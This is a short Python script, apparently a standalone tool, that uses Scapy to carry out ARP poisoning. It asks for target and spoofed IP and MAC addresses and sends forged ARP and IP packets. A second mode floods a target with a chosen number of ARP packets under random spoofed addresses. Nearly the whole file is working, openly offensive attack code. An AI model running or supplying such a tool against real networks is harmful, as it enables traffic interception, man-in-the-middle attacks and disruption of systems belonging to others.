#!/usr/bin/python3

from scapy.all import *
import os
import random


def main():
    os.system("clear")
    print("### Welcome to ARP Poisoning Tool ###", "\n")

    ARP_Packet = ARP()
    ICMP_Packet = IP()


    Menu(ARP_Packet, ICMP_Packet)

    ### info@emreovunc.com ###


def SourceIP(ARP_Packet, ICMP_Packet):
    srcIP = input("Fake IP : ")
    ARP_Packet.psrc = srcIP
    ICMP_Packet.src = srcIP


def DestinationIP(ARP_Packet, ICMP_Packet):
    dstIP = input("\nDestination IP : ")
    ARP_Packet.pdst = dstIP
    ICMP_Packet.dst = dstIP


def SourceHW(ARP_Packet):
    fakeMAC = input("Fake MAC : ")
    ARP_Packet.hwsrc = fakeMAC


def DestinationHW(ARP_Packet):
    dstMAC = input("Destination MAC : ")
    ARP_Packet.hwdst = dstMAC


def randomMAC():
    mac = [random.randint(0x00, 0xff), random.randint(0x00, 0xff), random.randint(0x00, 0xff),
           random.randint(0x00, 0x7f), random.randint(0x00, 0xff), random.randint(0x00, 0xff)]
    return ':'.join(map(lambda x: "%02x" % x, mac))


def randomIP():
    ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
    return ip


def ARP_Poisoning(ARP_Packet, ICMP_Packet):
    DestinationIP(ARP_Packet, ICMP_Packet)
    DestinationHW(ARP_Packet)
    SourceIP(ARP_Packet, ICMP_Packet)
    SourceHW(ARP_Packet)

    print("\n")
    ICMP_Packet.display()
    print("\n")
    ARP_Packet.show()

    send(ICMP_Packet)
    send(ARP_Packet)


def AutoARP(ARP_Packet, ICMP_Packet):
    ARP_Packet.hwsrc = randomMAC()
    randIP = randomIP()
    ARP_Packet.psrc = randIP
    ICMP_Packet.src = randIP

    send(ICMP_Packet)
    send(ARP_Packet)


def Menu(ARP_Packet, ICMP_Packet):
    print("[1] - Manual ARP Poisoning\n[2] - Auto ARP Packet Generation\n")
    answer = input("Enter [1] or [2] : ")

    if int(answer) == 1:
        ARP_Poisoning(ARP_Packet, ICMP_Packet)
    elif int(answer) == 2:
        DestinationIP(ARP_Packet, ICMP_Packet)
        cycle = input("How many fake ARP packets you want to generate: ")
        for x in range(0, int(cycle)):
            AutoARP(ARP_Packet, ICMP_Packet)
    else:
        print("[ERROR] Wrong Input !!!")
        main()


main()
